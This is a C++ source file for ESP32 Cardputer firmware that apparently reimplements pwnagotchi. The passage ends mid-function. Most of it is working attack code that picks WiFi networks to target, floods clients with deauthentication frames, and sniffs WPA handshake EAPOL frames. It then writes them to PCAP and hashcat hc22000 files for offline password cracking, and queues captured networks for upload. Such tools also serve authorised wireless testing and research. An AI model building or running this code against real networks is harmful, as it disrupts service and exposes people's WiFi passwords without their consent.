#include "pwnagothi.h"
#include "WiFi.h"
#include "ArduinoJson.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"
#include "pwngrid.h"
#include "api_client.h"
#include "src.h"
#include <vector>
#include <map>
#include "esp_wifi.h"
#include "settings.h"
#include "mood.h"
#include "wardrive.h"
#include "PMKIDGrabber.h"

#define EAPOL_KEY_TYPE_OFFSET   4
#define EAPOL_KEY_INFO_HI       5
#define EAPOL_KEY_INFO_LO       6
#define EAPOL_NONCE_OFFSET     17
#define EAPOL_MIC_OFFSET       81
#define CHANEL_HOP_INTERVAL_MS 100

std::vector<wifiRTResults> g_wifiRTResults;
wifiRTResults ap;
SemaphoreHandle_t wifiResultsMutex = nullptr;
const int networkTimeout = 10000;
unsigned long long lastHopTime = 0;

// EAPOL sniffer
struct CapturedPacket {
    size_t   len;
    uint8_t *data;
    uint32_t ts_sec;
    uint32_t ts_usec;
};

struct FileWriteRequest {
    char     filename[64];
    uint8_t *beaconFrame;
    uint16_t beaconFrameLen;
    uint32_t beaconTs_sec;
    uint32_t beaconTs_usec;
    std::vector<CapturedPacket*> packets;
    String   ssid;
    uint8_t  bssid[6];
    uint8_t  clientMac[6];   // client MAC observed in handshake (for hashcat)
    uint8_t  anonce[32];     // ANonce from EAPOL Msg1
    uint8_t  snonce[32];     // SNonce from EAPOL Msg2
    uint8_t  mic[16];        // MIC from EAPOL Msg2
    bool     hasAnonce;
    bool     hasSnonce;
    bool     hasMic;
};

static uint8_t *beaconFrame    = nullptr;
static uint16_t beaconFrameLen = 0;
static bool     beaconDetected = false;
static bool    targetAPSet = false;
static uint8_t targetBSSID[6];
static bool    eapolMsg[5] = {false};
static uint8_t capturedANonce[32];
static uint8_t capturedSNonce[32];
static uint8_t capturedMIC[16];
static uint8_t capturedClientMac[6];
static bool    hasANonce = false;
static bool    hasSNonce = false;
static bool    hasMIC    = false;
QueueHandle_t packetQueue    = nullptr;
QueueHandle_t fileWriteQueue = nullptr;
TaskHandle_t  pwnagotchiTaskHandle = nullptr;
TaskHandle_t  wardrivingTaskHandle = nullptr;
volatile bool pwnagotchiRunning    = false;
volatile bool wardrivingRunning    = false;

std::vector<String> pwnedAPs;
std::vector<String> failedClients;

static uint8_t targetClientMAC[6];
static bool    clientLocked = false;

struct pcap_hdr_s {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} __attribute__((packed));

struct pcaprec_hdr_s {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} __attribute__((packed));

File file;
bool pwnagothiModeEnabled;
static const size_t MAX_WHITELIST = 200;
uint8_t wifiCheckInt = 0;
String lastBlocked = "";
std::vector<wifiSpeedScan> g_speedScanResults;

void speedScanCallback(void* buf, wifi_promiscuous_pkt_type_t type){
    if(type != WIFI_PKT_MGMT){
        return;
    }
    logMessage("Mgmt packet received in speedScanCallback");
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    if(pkt->rx_ctrl.sig_len < 36){ // minimal length for beacon frame
        logMessage("Packet too short to be a beacon frame.");
        return;
    }
    if ((pkt->payload[0] & 0xF0) != 0x80) return;  // 0x80 = beacon frame subtype


    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t bssid[6];
    memcpy(bssid, pkt->payload + 10, 6);
    uint8_t channel = pkt->rx_ctrl.channel;
    // read channel from DS Parameter Set (tag 3) in the tagged parameters (fallback to radio channel)
    uint8_t ap_channel = channel;
    if (pkt->rx_ctrl.sig_len > 36) {
        int pos_ch = 36; // start of tagged parameters
        while (pos_ch + 2 <= pkt->rx_ctrl.sig_len - 1) {
            uint8_t tag = pkt->payload[pos_ch];
            uint8_t len = pkt->payload[pos_ch + 1];
            if (pos_ch + 2 + len > pkt->rx_ctrl.sig_len) break; // bounds check
            if (tag == 3 && len == 1) { // DS Parameter Set - current channel
                ap_channel = pkt->payload[pos_ch + 2];
                break;
            }
            pos_ch += 2 + len;
        }
    }
    channel = ap_channel;

    // capability info is at offsets 34..35 (fixed fields end at 36). privacy bit (0x0010) indicates security.
    uint16_t cap = (uint16_t)pkt->payload[34] | ((uint16_t)pkt->payload[35] << 8);
    bool secure = (cap & 0x0010) != 0;
    int ssid_len = pkt->payload[0x1F];
    String ssid = "";
    int pos = 36; // start of tagged parameters
    while (pos < pkt->rx_ctrl.sig_len - 2) {
        uint8_t tag = pkt->payload[pos];
        uint8_t len = pkt->payload[pos + 1];
        if (tag == 0 && len <= 32) { // SSID tag
            ssid = String((char*)(pkt->payload + pos + 2)).substring(0, len);
            break;
        }
        pos += 2 + len;
    }
    // Check for duplicates, then add if new to vector list
    for(auto &entry : g_speedScanResults){
        if(entry.ssid == ssid && entry.channel == channel){
            logMessage("Duplicate SSID detected: " + ssid + " on channel " + String(channel));
            return; // already exists
        }
    }
    g_speedScanResults.push_back({ssid, rssi, channel, secure, {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}});
}

std::vector<wifiSpeedScan> getSpeedScanResults(){
    return g_speedScanResults;
}

void speedScan(){
    logMessage("Starting speed scan...");
    g_speedScanResults.clear();
    g_speedScanResults.shrink_to_fit();
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous_rx_cb(speedScanCallback);
    esp_wifi_set_promiscuous(true);
    for(int ch = 1; ch <= 13; ch++){
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(120);
    }
    esp_wifi_set_promiscuous(false);
    xSemaphoreGive(wifiMutex);
    logMessage("Speed scan completed, found " + String(g_speedScanResults.size()) + " unique SSIDs.");
    
    for(auto &entry : g_speedScanResults){
        logMessage("SSID: " + entry.ssid + " | RSSI: " + String(entry.rssi) + " | Channel: " + String(entry.channel) + " | Secure: " + String(entry.secure));
    }
}


std::vector<String> parseWhitelist() {
    JsonDocument doc;

    DeserializationError err = deserializeJson(doc, whitelist);
    if (err) {
        logMessage(String("Failed to parse whitelist JSON: ") + err.c_str());
        return std::vector<String>();
    }

    JsonArray arr = doc.as<JsonArray>();
    size_t actualSize = arr.size();
    if (actualSize > MAX_WHITELIST) {
        logMessage(String("Whitelist contains ") + String(actualSize)
                   + " entries; truncating to " + String(MAX_WHITELIST));
        actualSize = MAX_WHITELIST;
    }

    std::vector<String> result;
    result.reserve(actualSize);

    size_t i = 0;
    for (JsonVariant v : arr) {
        if (i++ >= actualSize) break;
        const char* s = v.as<const char*>();
        if (s) result.emplace_back(String(s));
        else result.emplace_back(String());
    }

    return result;
}

void addToWhitelist(const String &valueToAdd) {
    JsonDocument oldDoc;
    DeserializationError err = deserializeJson(oldDoc, whitelist);
    if (err) {
        oldDoc.to<JsonArray>();
    }

    JsonArray oldArr = oldDoc.as<JsonArray>();
    JsonDocument newDoc;
    JsonArray newArr = newDoc.to<JsonArray>();

    size_t count = 0;
    for (JsonVariant v : oldArr) {
        if (count++ >= MAX_WHITELIST) break;
        newArr.add(v.as<const char*>());
    }

    if (count < MAX_WHITELIST) {
        newArr.add(valueToAdd.c_str());
    } else {
        logMessage("Whitelist at capacity, not adding: " + valueToAdd);
    }

    String out;
    serializeJson(newDoc, out);
    whitelist = out;
    saveSettings();
}


void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    String newWhitelist;
    serializeJson(list, newWhitelist);
    whitelist = newWhitelist;
    saveSettings();
}

void convert_normal_scan_to_speedscan(){
    int n = WiFi.scanComplete();
    for(int i = 0; i < n; i++){
        wifiSpeedScan entry;
        entry.ssid = WiFi.SSID(i);
        entry.rssi = WiFi.RSSI(i);
        entry.channel = WiFi.channel(i);
        entry.secure = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
        String bssidStr = WiFi.BSSIDstr(i);
        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &entry.bssid[0], &entry.bssid[1], &entry.bssid[2], &entry.bssid[3], &entry.bssid[4], &entry.bssid[5]);
        g_speedScanResults.push_back(entry);
    }
}

bool pwnagothiScan;

void legacyLoop(){
    if(pwnagothiScan){
        fLogMessage("Scan requested, current epoch state: %d happy epochs, %d sad epochs, total epochs: %d", tot_happy_epochs, tot_sad_epochs, allTimeEpochs);
        setMoodLooking(0);
        updateUi(true, false);
        WiFi.scanNetworks();
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            if(auto_mode_and_wardrive){
                convert_normal_scan_to_speedscan();
                wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
            }
            logMessage("Scan completed proceeding to attack!");
            setIDLEMood();
            updateUi(true, false);
            delay(pwnagotchi.delay_after_wifi_scan);
        }
    }
    else{
        setIDLEMood();
        updateUi(true, false);
        delay(pwnagotchi.delay_before_switching_target);
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("No networks found. Waiting and retrying");
            tot_sad_epochs++;
            setMoodSad();
            updateUi(true, false);
            delay(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
            return;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            allTimeEpochs++;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setIDLEMood();
        logMessage("Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        updateUi(true, false);
        delay(pwnagotchi.delay_after_picking_target);
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if (whitelistParsed[i] == attackVector) {
                logMessage("Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                tot_sad_epochs++;
                updateUi(true, false);
                wifiCheckInt++;
                allTimeEpochs++;
                return;
            }
        }
        setIDLEMood();
        logMessage("I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 0;
        uint8_t currentCount = SnifferGetClientCount();
        if(!setMac(WiFi.BSSID(wifiCheckInt))){
            logMessage("Failed to set target MAC for: " + attackVector);
            logMessage("Skipping to next target.");
            tot_sad_epochs++;
            wifiCheckInt++;
            allTimeEpochs++;
            return;
        }
        uint16_t targetChanel;
        uint8_t result = set_target_channel(attackVector.c_str());
        if (result != 0) {
            targetChanel = result;
        } else {
            pwnagothiScan = false;
            allTimeEpochs++;
            return;
        }
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
                logMessage("Attack failed: Timeout waiting for client.");
                SnifferEnd();
                initPwngrid();
                tot_sad_epochs++;
                updateUi(true, false);
                delay(pwnagotchi.delay_after_no_clients_found);
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionTime = millis();
                wifiCheckInt++;
                allTimeEpochs++;
                return;
            }
            if(!clients[i].isEmpty()){
                logMessage("Client count: " + String(clientLen));
                logMessage("I think that " + clients[i] + " doesn't need an internet...");
                logMessage("WiFi BSSID is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                updateUi(true, false);
                delay(pwnagotchi.delay_after_client_found);
                stopClientSniffing();
                break;
            }
            updateUi(true, false);
        }
        logMessage("Well, well, well  " + clients[i] + " you're OUT!!!");
        updateUi(true, false);
        setTargetAP(WiFi.BSSID(wifiCheckInt));
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
            logMessage("Deauth succesful, proceeding to sniff...");
            lastSessionDeauths++;
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                allTimeEpochs++;
                pwnagothiScan = true;
                return;
            }
        }
        setMoodLooking(0);
        logMessage("Sniff, sniff... Looking for handshake...");
        updateUi(true, false);
        unsigned long startTime1 = millis();
        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        while(true){
            SnifferLoop();
            updateUi(true, false);
            delay(10);
            if (SnifferGetClientCount() > 0) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMoodToNewHandshake(1);
                logMessage("Got new handshake!!!");
                api_client::queueAPForUpload(attackVector, String(WiFi.BSSIDstr(wifiCheckInt)));
                if(getLocationAfterPwn){
                    wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
                }
                lastPwnedAP = attackVector;
                updateUi(true, false);
                SnifferEnd();
                initPwngrid();
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionCaptures = sessionCaptures;
                lastSessionTime = millis();
                tot_happy_epochs += 3;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    delay(100);
                    Sound(2000, 100, true);
                    delay(100);
                    Sound(2500, 150, true);
                    delay(150);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }
            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                setMoodToAttackFailed(attackVector);
                logMessage("Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                initPwngrid();
                updateUi(true, false);
                
                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionTime = millis();
                saveSettings();
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    delay(150);
                    Sound(500, 150, true);
                    delay(150);
                    Sound(300, 200, true);
                    delay(200);
                }
                break;
            }
        }
    }
    setIDLEMood();
    logMessage("Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    updateUi(true, false);
    lastSessionPeers = getPwngridTotalPeers();
    lastSessionTime = millis();
    allTimeEpochs++;
    saveSettings();
    delay(pwnagotchi.nap_time);
}

bool networkStillExists(const String& ssid, int channel) {
    if (wifiResultsMutex == nullptr) return false;
    if (xSemaphoreTake(wifiResultsMutex, 0) != pdTRUE) return false;
    bool found = false;
    for (const auto& entry : g_wifiRTResults) {
        if (entry.ssid == ssid && entry.channel == channel) {
            if (millis() - entry.lastSeen <= networkTimeout) found = true;
            break;
        }
    }
    xSemaphoreGive(wifiResultsMutex);
    return found;
}

bool isHandshakeComplete() {
    return (eapolMsg[1] && eapolMsg[2] && eapolMsg[3] && eapolMsg[4]);
}

static inline int ieee80211_hdrlen(uint16_t fc) {
    int hdrlen = 24;
    uint8_t type    = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    if (type == 2) {
        if ((fc & 0x0300) == 0x0300) hdrlen += 6; // 4-addr frame
        if (subtype & 0x08)          hdrlen += 2; // QoS
    }
    if (fc & 0x8000) hdrlen += 4; // HT control
    return hdrlen;
}

uint8_t getEAPOLOrder(uint8_t *buf, size_t buf_len) {
    if (buf == nullptr || buf_len < 32) return 0;

    uint16_t fc     = buf[0] | (buf[1] << 8);
    int      hdrlen = ieee80211_hdrlen(fc);
    if (hdrlen < 24 || hdrlen > 40) return 0;
    if ((int)buf_len < hdrlen + 18) return 0;

    const uint8_t *llc = buf + hdrlen;
    if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
          llc[3]==0x00 && llc[4]==0x00 && llc[5]==0x00 &&
          llc[6]==0x88 && llc[7]==0x8E)) return 0;

    const uint8_t *eapol = llc + 8;
    int eapol_len = (int)buf_len - hdrlen - 8;

    if (eapol[1] != 3) return 0;
    if (eapol_len > EAPOL_KEY_TYPE_OFFSET && eapol[EAPOL_KEY_TYPE_OFFSET] != 2) return 0;
    if (eapol_len < EAPOL_KEY_INFO_LO + 1) return 0;

    uint16_t key_info = ((uint16_t)eapol[EAPOL_KEY_INFO_HI] << 8) | eapol[EAPOL_KEY_INFO_LO];

    bool mic     = key_info & (1 << 8);
    bool ack     = key_info & (1 << 7);
    bool install = key_info & (1 << 6);
    bool secure  = key_info & (1 << 9);

    uint8_t msgNum = 0;
    if      (!mic &&  ack && !install && !secure) msgNum = 1;
    else if ( mic && !ack && !install && !secure) msgNum = 2;
    else if ( mic &&  ack &&  install &&  secure) msgNum = 3;
    else if ( mic && !ack && !install &&  secure) msgNum = 4;

    if (msgNum == 0) {
        fLogMessage("Unknown EAPOL key_info=0x%04X", key_info);
        return 0;
    }

    logMessage("EAPOL Message " + String(msgNum) + " detected");
    return msgNum;
}

extern void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type);

void wifiRTScanCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt == nullptr) return;

    uint16_t       len     = pkt->rx_ctrl.sig_len;
    const uint8_t *payload = pkt->payload;
    int8_t         rssi    = pkt->rx_ctrl.rssi;
    uint8_t        channel = pkt->rx_ctrl.channel;
    uint8_t        bssid[6];
    memcpy(bssid, payload + 10, 6);

    if (type == WIFI_PKT_MGMT) {
        uint8_t ap_channel = channel;
        if (pkt->rx_ctrl.sig_len > 36) {
            int pos_ch = 36;
            while (pos_ch + 2 <= (int)pkt->rx_ctrl.sig_len - 1) {
                uint8_t tag     = pkt->payload[pos_ch];
                uint8_t len_tag = pkt->payload[pos_ch + 1];
                if (pos_ch + 2 + len_tag > (int)pkt->rx_ctrl.sig_len) break;
                if (tag == 3 && len_tag == 1) { ap_channel = pkt->payload[pos_ch + 2]; break; }
                pos_ch += 2 + len_tag;
            }
        }
        channel = ap_channel;

        uint16_t cap    = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
        bool     secure = (cap & 0x0010) != 0;

        String ssid = "";
        int    pos  = 36;
        while (pos + 2 < (int)pkt->rx_ctrl.sig_len) {
            uint8_t tag     = payload[pos];
            uint8_t len_tag = payload[pos + 1];
            if (pos + 2 + len_tag > (int)pkt->rx_ctrl.sig_len) break;
            if (tag == 0 && len_tag <= 32) {
                ssid = String((char *)(payload + pos + 2), len_tag);
                break;
            }
            pos += 2 + len_tag;
        }
        if (ssid.length() == 0) return;

        wifiRTResults newResult = { ssid, rssi, channel, secure,
            {bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]}, millis() };

        if (wifiResultsMutex && xSemaphoreTake(wifiResultsMutex, 0) == pdTRUE) {
            bool dup = false;
            for (auto &entry : g_wifiRTResults) {
                if (entry.ssid == ssid && entry.channel == channel) {
                    entry.rssi     = rssi;
                    entry.lastSeen = millis();
                    dup = true;
                    break;
                }
            }
            if (!dup) g_wifiRTResults.push_back(newResult);

            g_wifiRTResults.erase(std::remove_if(g_wifiRTResults.begin(), g_wifiRTResults.end(),
                [](const wifiRTResults &e) { return millis() - e.lastSeen > 5000; }),
                g_wifiRTResults.end());
            xSemaphoreGive(wifiResultsMutex);
        }

        if (len < 24) return;
        uint16_t fc       = payload[0] | (payload[1] << 8);
        uint8_t  ftype    = (fc >> 2) & 0x3;
        uint8_t  fsubtype = (fc >> 4) & 0xF;

        if (ftype == 0 && fsubtype == 8 && !beaconDetected) {
            if (!targetAPSet) return;
            if (memcmp(payload + 16, targetBSSID, 6) != 0) return;

            uint16_t beaconLen = (len > 4) ? len - 4 : len;
            uint8_t *fb = (uint8_t *)malloc(beaconLen);
            if (!fb) return;
            memcpy(fb, payload, beaconLen);
            beaconFrame    = fb;
            beaconFrameLen = beaconLen;
            beaconDetected = true;
            logMessage("Beacon frame captured.");
        }
        return;
    }

    // ---- DATA frames: EAPOL capture ----
    if (type == WIFI_PKT_DATA) {
        if (ap.ssid.length() == 0)              return;
        if (!beaconDetected || !beaconFrame)    return;

        uint16_t fc     = payload[0] | (payload[1] << 8);
        int      hdrlen = ieee80211_hdrlen(fc);
        if ((int)len < hdrlen + 8) return;

        const uint8_t *llc = payload + hdrlen;
        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
              llc[6]==0x88 && llc[7]==0x8E)) return;

        bool toDS   = (fc >> 8) & 0x01;
        bool fromDS = (fc >> 8) & 0x02;
        const uint8_t *pktBSSID;
        if      ( toDS && !fromDS) pktBSSID = payload + 4;
        else if (!toDS &&  fromDS) pktBSSID = payload + 10;
        else                       pktBSSID = payload + 16;

        if (memcmp(pktBSSID, targetBSSID, 6) != 0) return;

        const uint8_t *staMac = toDS ? (payload + 10) : (payload + 4);

        if (clientLocked) {
            if (memcmp(staMac, targetClientMAC, 6) != 0) return;
        }

        uint8_t msgNum = getEAPOLOrder((uint8_t *)payload, len);

        if (msgNum == 1 && !clientLocked) {
            memcpy(targetClientMAC, staMac, 6);
            clientLocked = true;
            logMessage("Client locked: " +
                String(staMac[0],HEX) + ":" + String(staMac[1],HEX) + ":" +
                String(staMac[2],HEX) + ":" + String(staMac[3],HEX) + ":" +
                String(staMac[4],HEX) + ":" + String(staMac[5],HEX));
        }

        if (msgNum >= 1 && msgNum <= 4) eapolMsg[msgNum] = true;

        if (len == 0 || len > MAX_PKT_SIZE) return;

        const uint8_t *eapol = llc + 8;
        int eapol_len = (int)len - hdrlen - 8;

        // FIX: Use single EAPOL_NONCE_OFFSET for both ANonce and SNonce
        if (msgNum == 1 && eapol_len >= EAPOL_NONCE_OFFSET + 32) {
            memcpy(capturedANonce, eapol + EAPOL_NONCE_OFFSET, 32);
            hasANonce = true;
            memcpy(capturedClientMac, staMac, 6);
        }
        if (msgNum == 2 && eapol_len >= EAPOL_MIC_OFFSET + 16) {
            memcpy(capturedSNonce, eapol + EAPOL_NONCE_OFFSET, 32);
            memcpy(capturedMIC,    eapol + EAPOL_MIC_OFFSET,   16);
            hasSNonce = true;
            hasMIC    = true;
        }

        CapturedPacket *p = (CapturedPacket *)malloc(sizeof(CapturedPacket));
        if (!p) return;
        p->data = (uint8_t *)malloc(len);
        if (!p->data) { free(p); return; }

        memcpy(p->data, payload, len);
        p->len = len;

        uint64_t ts = esp_timer_get_time();
        p->ts_sec  = ts / 1000000;
        p->ts_usec = ts % 1000000;

        // Use ISR-safe send since this callback may be called from a high-priority
        // WiFi task. Non-ISR xQueueSend would be unsafe here.
        BaseType_t woken = pdFALSE;
        if (xQueueSendFromISR(packetQueue, &p, &woken) != pdTRUE) {
            free(p->data);
            free(p);
        } else if (woken) {
            portYIELD_FROM_ISR();
        }
    }
}

static void unifiedSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifiRTScanCallback(buf, type);
    pwnSnifferCallback(buf, type);
}

static void writeHashcatFile(FileWriteRequest *req) {
    if (!req->hasAnonce || !req->hasMic || !req->hasSnonce) {
        logMessage("[Hashcat] Missing nonces/MIC, skipping hashcat file.");
        return;
    }

    size_t ssidLen = min((size_t)32, req->ssid.length());
    char hcFilename[80];
    strncpy(hcFilename, req->filename, sizeof(hcFilename) - 1);
    hcFilename[sizeof(hcFilename) - 1] = '\0';
    char *dot = strrchr(hcFilename, '.');
    if (dot) strcpy(dot, ".hc22000");
    else     strncat(hcFilename, ".hc22000", sizeof(hcFilename) - strlen(hcFilename) - 1);

    const uint8_t *eapol2Raw    = nullptr;
    uint16_t       eapol2RawLen = 0;

    for (auto *pkt : req->packets) {
        if (!pkt || !pkt->data) continue;
        uint16_t fc      = pkt->data[0] | (pkt->data[1] << 8);
        int      hdrlen  = ieee80211_hdrlen(fc);
        if ((int)pkt->len < hdrlen + 8) continue;

        const uint8_t *llc = pkt->data + hdrlen;
        if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 &&
              llc[6]==0x88 && llc[7]==0x8E)) continue;

        const uint8_t *eapol    = llc + 8;
        int            eapolLen = (int)pkt->len - hdrlen - 8;
        if (eapolLen < 8) continue;
        if (eapol[1] != 3) continue;

        uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
        bool mic     = key_info & (1 << 8);
        bool ack     = key_info & (1 << 7);
        bool install = key_info & (1 << 6);
        bool secure  = key_info & (1 << 9);

        if (mic && !ack && !install && !secure) {
            eapol2Raw    = eapol;
            eapol2RawLen = (uint16_t)eapolLen;
            break;
        }
    }

    if (!eapol2Raw || eapol2RawLen == 0) {
        logMessage("[Hashcat] Could not locate raw EAPOL Msg2, skipping.");
        return;
    }

    auto toHex = [](const uint8_t *src, int len, char *dst) {
        for (int i = 0; i < len; i++) sprintf(dst + i * 2, "%02x", src[i]);
        dst[len * 2] = '\0';
    };

    char apMacHex[13], staMacHex[13], ssidHex[65];
    char anonceHex[65], snonceHex[65], micHex[33];

    toHex(req->bssid,                          6,       apMacHex);
    toHex(req->clientMac,                      6,       staMacHex);
    toHex((uint8_t*)req->ssid.c_str(), ssidLen,         ssidHex);
    toHex(req->anonce,                         32,      anonceHex);
    toHex(req->snonce,                         32,      snonceHex);
    toHex(req->mic,                            16,      micHex);

    char *eapol2Hex = (char *)malloc(eapol2RawLen * 2 + 1);
    if (!eapol2Hex) {
        logMessage("[Hashcat] malloc failed for eapol2Hex");
        return;
    }
    toHex(eapol2Raw, eapol2RawLen, eapol2Hex);

    File hcFile = FSYS.open(hcFilename, FILE_WRITE, true);
    if (!hcFile) {
        logMessage("[Hashcat] Failed to open: " + String(hcFilename));
        free(eapol2Hex);
        return;
    }

    hcFile.printf("WPA*02*%s*%s*%s*%s*%s*%s*02\n",
        micHex, apMacHex, staMacHex, ssidHex, anonceHex, eapol2Hex);

    hcFile.close();
    logMessage("[Hashcat] Written: " + String(hcFilename));
    free(eapol2Hex);
}

void handleFileWrite(FileWriteRequest *req) {
    
    if(wardriveMutex)xSemaphoreTake(wardriveMutex, portMAX_DELAY);
    if (!req) return;
    logMessage("[FileWriter] Writing PCAP for: " + req->ssid);

    if (!FSYS.exists("/M5Gotchi/handshake")) {
        FSYS.mkdir("/M5Gotchi/handshake");
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    File f = FSYS.open(req->filename, FILE_WRITE, true);
    if (!f) {
        logMessage("[FileWriter] ERROR: Failed to open: " + String(req->filename));
        xSemaphoreGive(wardriveMutex);
        goto cleanup;
    }

    {
        pcap_hdr_s gh;
        gh.magic_number  = 0xa1b2c3d4;
        gh.version_major = 2;
        gh.version_minor = 4;
        gh.thiszone      = 0;
        gh.sigfigs       = 0;
        gh.snaplen       = 65535;
        gh.network       = 105; // LINKTYPE_IEEE802_11
        f.write((uint8_t *)&gh, sizeof(gh));
        f.flush();

        if (req->beaconFrame && req->beaconFrameLen > 0) {
            pcaprec_hdr_s rh;
            rh.ts_sec  = req->beaconTs_sec;
            rh.ts_usec = req->beaconTs_usec;
            rh.incl_len = rh.orig_len = req->beaconFrameLen;
            f.write((uint8_t *)&rh, sizeof(rh));
            f.write(req->beaconFrame, req->beaconFrameLen);
            f.flush();
        }

        for (auto *pkt : req->packets) {
            if (!pkt || !pkt->data) continue;
            pcaprec_hdr_s rh;
            rh.ts_sec  = pkt->ts_sec;
            rh.ts_usec = pkt->ts_usec;
            rh.incl_len = rh.orig_len = pkt->len;
            f.write((uint8_t *)&rh, sizeof(rh));
            f.write(pkt->data, pkt->len);
            f.flush();
        }

        f.close();
        logMessage("[FileWriter] PCAP closed: " + String(req->filename));
    }

    writeHashcatFile(req);
    if(wardriveMutex)xSemaphoreGive(wardriveMutex);

cleanup:
    if (req->beaconFrame) free(req->beaconFrame);
    for (auto *pkt : req->packets) {
        if (pkt && pkt->data) free(pkt->data);
        if (pkt) free(pkt);
    }
    req->packets.clear();
    delete req;
}

bool pwn::begin() {
    allTimeDeauths += lastSessionDeauths;
    allSessionTime += lastSessionTime;
    allTimePeers += lastSessionPeers;
    lastSessionDeauths = 0;
    lastSessionCaptures = 0;
    lastSessionPeers = 0;
    lastSessionTime = 0;
    saveSettings();
    #ifndef BUTTON_ONLY_INPUT
    drawInfoBox("Waiting", "3 seconds to cancel", "Press ` to cancel", false, false);
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                debounceDelay();
                setMID();
                return false;
            }
        }
    }
    #else
    drawInfoBox("Waiting", "3 seconds to cancel", "Press any button to cancel", false, false);
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        inputManager::update();
        if(inputManager::isButtonAPressed() || inputManager::isButtonBPressed()){
            debounceDelay();
            setMID();
            return false;
        }
    }
    #endif
    logMessage("Pwnagothi auto mode init!");
    parseWhitelist();
    pwnagothiMode = true;
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    WiFi.disconnect(false, true);
    WiFi.mode(WIFI_STA);
    xSemaphoreGive(wifiMutex);

    if (wifiResultsMutex == nullptr) {
        wifiResultsMutex = xSemaphoreCreateMutex();
        if (!wifiResultsMutex) { logMessage("Failed to create mutex!"); return false; }
    }
    if (packetQueue == nullptr) {
